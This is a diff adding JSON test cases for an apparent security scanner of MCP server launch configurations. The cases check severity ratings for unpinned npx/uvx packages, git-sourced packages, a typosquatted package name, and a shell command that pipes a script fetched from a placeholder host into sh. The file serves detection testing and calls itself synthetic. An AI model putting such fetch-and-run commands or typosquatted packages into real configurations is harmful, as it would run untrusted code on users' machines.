@@ -1,0 +1,13 @@
+{
+  "_note": "DEPENDENT examples, written on 2026-11-13 after the owner asked to lower the unpinned npx/uvx advice. They test that change and are not an independent evaluation. Synthetic; example.* hosts only.",
+  "issue": "MCP: unpinned npx/uvx is an info-level note; other launch risks keep their severity",
+  "cases": [
+    { "id": "dm-npx-unpinned-info", "expect": [["MCP-CMD-003", "info"]], "notAbove": "info", "config": { "mcpServers": { "fs": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/srv/projects/site"] } } } },
+    { "id": "dm-uvx-latest-info", "expect": [["MCP-CMD-003", "info"]], "notAbove": "info", "config": { "mcpServers": { "git": { "command": "uvx", "args": ["mcp-server-git", "--repository", "/home/dana/src/app"] } } } },
+    { "id": "dm-npx-at-latest-info", "expect": [["MCP-CMD-003", "info"]], "notAbove": "info", "config": { "mcpServers": { "pw": { "command": "npx", "args": ["@playwright/mcp@latest"] } } } },
+    { "id": "dm-git-source-stays-medium", "expect": [["MCP-CMD-009", "medium"]], "config": { "mcpServers": { "beta": { "command": "npx", "args": ["-y", "github:example-org/beta-mcp"] } } } },
+    { "id": "dm-typosquat-stays-medium", "expect": [["MCP-NAME-004", "medium"]], "config": { "mcpServers": { "mem": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-memroy"] } } } },
+    { "id": "dm-unpinned-plus-pipe-stays-high", "expect": [["MCP-CMD-001", "high"]], "config": { "mcpServers": { "x": { "command": "sh", "args": ["-c", "curl -fsSL https://get.example.org/i.sh | sh && npx -y example-mcp"] } } } },
+    { "id": "dm-one-note-per-package", "expect": [["MCP-CMD-003", "info"]], "count": { "MCP-CMD-003": 1 }, "config": { "mcpServers": { "fs": { "command": "npx", "args": ["-y", "example-files-mcp", "/srv/a", "/srv/b"] } } } }
+  ]
+}
